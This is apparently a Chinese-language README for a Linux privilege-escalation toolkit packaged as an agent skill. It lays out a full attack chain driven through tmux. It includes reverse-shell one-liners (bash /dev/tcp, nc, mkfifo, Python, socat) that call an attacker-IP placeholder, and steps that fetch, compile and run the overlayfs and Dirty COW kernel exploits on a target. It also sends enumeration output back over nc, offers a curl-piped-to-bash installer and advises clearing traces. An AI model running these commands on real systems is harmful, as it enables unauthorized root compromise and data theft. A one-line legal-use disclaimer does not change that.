# 🐧 linux-privesc-linpeas

> 端到端 Linux 提权辅助工具集 — 适用于渗透测试、CTF 夺旗、红队评估

[![GitHub](https://img.shields.io/badge/GitHub-mcc0624%2Flinux--privesc--linpeas-blue)](https://github.com/mcc0624/linux-privesc-linpeas)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
![Platform](https://img.shields.io/badge/platform-Linux-lightgrey)

---

## 📋 概述

自动化 Linux 提权工作流，覆盖从**反弹 shell 接收 → 信息收集 → 漏洞分析 → exploit 执行 → 提权成功**全链路：

```
目标反弹 shell
       ↓
  ┌─ 接收 shell (6767) ───────────────────┐
  │  tmux 管理 socat 监听                  │
  │  (全部交互走 tmux send-keys)           │
  └──────────────┬────────────────────────┘
                 ↓
  ┌─ 资产枚举 ────────────────────────────┐
  │  linPEAS 自动上传并执行                │
  │  linux-exploit-suggester 辅助验证      │
  └──────────────┬────────────────────────┘
                 ↓
  ┌─ 结果分析 ────────────────────────────┐
  │  提取 CVE / SUID / sudo / cron / 密码  │
  │  匹配内核版本可用 exploit               │
  └──────────────┬────────────────────────┘
                 ↓
  ┌─ CVE 测试 & 提权 ────────────────────┐
  │  overlayfs (CVE-2015-1328)           │
  │  Dirty COW (CVE-2016-5195)           │
  │  更多 CVE 按优先级顺序测试             │
  └──────────────┬────────────────────────┘
                 ↓
  ┌─ 交付 ───────────────────────────────┐
  │  root shell → 用户自备 8989 监听      │
  │  PoC 代码 + 使用说明                  │
  └──────────────────────────────────────┘
```

---

## 🔑 核心设计

### 全部交互走 tmux
不建前台交互 shell，所有操作通过 tmux 会话管理：

```bash
tmux send-keys -t revshell "command" Enter   # 发命令
tmux capture-pane -t revshell -p -S -30      # 读输出
```

### 8989 用户自备监听
本工具只管在提权后将 root shell **发送** 到 8989，**用户需提前在另一个终端开监听**：

```bash
# 用户自行执行 → 另一个终端
nc -lvnp 8989
```

---

## 🎯 适用场景

| 场景 | 说明 |
|------|------|
| 🏴 **CTF / VulnHub** | 快速提权，拿 flag |
| 🔴 **红队 / 渗透测试** | 内网 Linux 机器横向后的提权阶段 |
| 🧪 **实验室练习** | 系统性学习 Linux 提权技术 |
| 📚 **教学演示** | 展示完整的提权攻击链 |

---

## 🚀 快速开始

### 依赖检查

```bash
which socat nc python3 curl wget tmux gcc git 2>/dev/null
```

### 一键部署

```bash
bash <(curl -sL https://raw.githubusercontent.com/mcc0624/linux-privesc-linpeas/main/scripts/setup_listener.sh)
```

### 手动部署（推荐 — 理解每一层）

```bash
# 1. 创建 tmux 会话，所有 shell 交互都在里面
tmux new-session -d -s revshell
tmux send-keys -t revshell \
  "socat TCP-LISTEN:6767,fork,reuseaddr -" Enter

# 2. 下载工具到 /tmp
curl -sL -o /tmp/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
curl -sL -o /tmp/ofs.c https://www.exploit-db.com/raw/37292
curl -sL -o /tmp/dirtycow.c https://www.exploit-db.com/raw/40839
chmod +x /tmp/linpeas.sh

# 3. HTTP 文件服务
cd /tmp && python3 -m http.server 8888 &

# 4. 通知用户另开终端收 root shell
echo "========================================"
echo "请另开一个终端执行: nc -lvnp 8989"
echo "提权后 root shell 会反弹到这个端口"
echo "========================================"
```

---

## 📦 文件结构

```
linux-privesc-linpeas/
├── SKILL.md                          # OpenClaw 技能定义
├── README.md                         # 本文件
├── scripts/
│   ├── setup_listener.sh             # 一键部署监听 + HTTP + 工具下载
│   ├── recv_post.py                  # HTTP POST 文件接收器（目标→本机）
│   └── analyze_peas.py               # linPEAS 输出自动分析器
└── references/
    └── CVE_QUICK_REF.md              # Linux 提权 CVE 速查表
```

---

## 📖 详细使用指南

### 第0步：tmux 交互方式（贯穿全程）

**所有发给目标 shell 的命令都用 tmux，不在前台建交互式 shell。**

```bash
# 发命令
tmux send-keys -t revshell "whoami; hostname; id; uname -a" Enter

# 读输出（最近 30 行）
sleep 3
tmux capture-pane -t revshell -p -S -30

# 读全部
sleep 3
tmux capture-pane -t revshell -p -S -
```

### 第1步：目标反弹 shell 到 6767

目标机上执行（任选其一）:

```bash
# Bash（推荐）
bash -i >& /dev/tcp/<攻击机IP>/6767 0>&1

# Netcat（支持 -e）
nc -e /bin/bash <攻击机IP> 6767

# Netcat（无 -e）—— fifo 方式
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <攻击机IP> 6767 >/tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<攻击机IP>",6767));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Socat
socat TCP:<攻击机IP>:6767 EXEC:/bin/bash
```

### 第2步：tmux 交互 → 收集基本信息

```bash
tmux send-keys -t revshell \
  "which wget curl python python3 nc gcc g++ cc 2>/dev/null; echo '===DIV==='; id; uname -a; cat /etc/os-release 2>/dev/null || cat /etc/*release 2>/dev/null; ip addr" Enter
sleep 4
tmux capture-pane -t revshell -p -S -30
```

### 第3步：tmux 交互 → 上传并执行 linPEAS

```bash
# 下载 linPEAS
tmux send-keys -t revshell \
  "cd /tmp && wget -q http://<攻击机IP>:8888/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && echo OK" Enter
sleep 3
tmux capture-pane -t revshell -p -S -5

# 执行并保存结果
tmux send-keys -t revshell \
  "./linpeas.sh 2>/dev/null | tee /tmp/peas-out.txt && echo '===PEAS_DONE==='" Enter
# 等待 30-60s（取决于目标机性能）
```

### 第4步：取回结果文件

```bash
# 本机起 nc 接收
# 注意: 用短暂的后台 nc，不要干扰 tmux 会话
nc -lvp 9996 > /tmp/target_peas.txt 2>/dev/null &

# tmux 中发文件
tmux send-keys -t revshell \
  "nc <攻击机IP> 9996 < /tmp/peas-out.txt && echo SENT || echo FAIL" Enter

# 等待传输完成
sleep 10
```

### 第5步：分析结果

```bash
# 快速提取关键信息
grep -iE 'CVE-[0-9]{4}' /tmp/target_peas.txt | sort -u
grep -iE 'SUID|SUDO|WRITABLE|PASSWORD|CRON|KERNEL' /tmp/target_peas.txt | head -30

# 或用分析脚本
python3 scripts/analyze_peas.py /tmp/target_peas.txt
```

### 第6步：CVE 匹配 & 提权

根据内核版本和发行版选择 exploit。

#### overlayfs (CVE-2015-1328) — 🥇 首选

适用于：Ubuntu 12.04/14.04，内核 3.13.0-3.19.0

```bash
tmux send-keys -t revshell \
  "cd /tmp && wget -q http://<攻击机IP>:8888/ofs.c -O ofs.c && gcc ofs.c -o ofs && ./ofs && id || echo FAIL" Enter
sleep 5
tmux capture-pane -t revshell -p -S -10
# 看到 # → root shell
```

#### Dirty COW (CVE-2016-5195) — 🥈 备选

适用于：内核 2.6.22-4.8.3，全平台

```bash
tmux send-keys -t revshell \
  "cd /tmp && wget -q http://<攻击机IP>:8888/dirtycow.c -O dirty.c && gcc -pthread dirty.c -o dirty -lcrypt && ./dirty pwned123" Enter
# 等待执行完成后:
tmux send-keys -t revshell "su firefart" Enter
# 密码: pwned123
```

### 第7步：反转 root shell → 用户 8989

**提权成功后，root shell 反转给用户自备的 8989 监听：**

```bash
# 通知用户确认监听
# 请确保另一个终端有: nc -lvnp 8989

# 方案A: bash（如果目标有 /dev/tcp）
tmux send-keys -t revshell \
  "bash -i >& /dev/tcp/<攻击机IP>/8989 0>&1" Enter

# 方案B: python（当前 shell 是 sh 时用）
tmux send-keys -t revshell \
  'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<攻击机IP>\",8989));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));subprocess.call([\"/bin/sh\",\"-i\"])"' Enter

# 方案C: nc fifo（通用）
tmux send-keys -t revshell \
  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <攻击机IP> 8989 >/tmp/f" Enter
```

---

## 🛠 辅助脚本说明

### `setup_listener.sh` — 一键部署

```bash
chmod +x setup_listener.sh
./setup_listener.sh [监听端口] [HTTP端口] [反转shell端口]
# 默认: 6767 8888 8989
```

自动完成：
- 下载 linPEAS、exploit-suggester、CVE exploit 源码到 `/tmp`
- 创建 tmux revshell 会话 + socat 6767 监听
- 启动 HTTP 8888 文件服务
- 打印完整使用指南（包括提示用户自行监听 8989）

### `analyze_peas.py` — 自动分析

```bash
python3 analyze_peas.py /tmp/peas-output.txt
```

提取信息：
- 内核版本 / OS 发行版
- 所有匹配的 CVE 编号
- SUID / SGID 文件
- sudo 权限配置
- cron 定时任务
- 可写路径
- 敏感信息（密码、密钥、MySQL）

### `recv_post.py` — 文件接收

```bash
python3 recv_post.py [端口] [输出路径]
# 默认: 9997 /tmp/recv_file.txt
```

收到一次 POST 后自动退出。

---

## ⚠️ 安全声明

1. **仅用于合法授权测试。** 未经授权的使用可能违反法律。
2. **备份重要数据。** 某些 exploit 可能导致系统不稳定或数据丢失。
3. **清理痕迹。** 提权成功后及时清理临时文件。
4. **8989 监听由用户自行维护。** 本工具仅负责发送 shell。

---

## 📚 技术参考

| 资源 | 链接 |
|------|------|
| linPEAS / PEASS-ng | https://github.com/peass-ng/PEASS-ng |
| Linux Exploit Suggester | https://github.com/mzet-/linux-exploit-suggester |
| HackTricks Linux PrivEsc | https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html |
| Exploit Database | https://www.exploit-db.com |
| CVE-2015-1328 详情 | https://nvd.nist.gov/vuln/detail/CVE-2015-1328 |
| CVE-2016-5195 详情 | https://nvd.nist.gov/vuln/detail/CVE-2016-5195 |

---

## 📄 License

[MIT](LICENSE)

---

**刚打下一台机器？下一步就该提权了。这工具帮你少敲几个命令。**
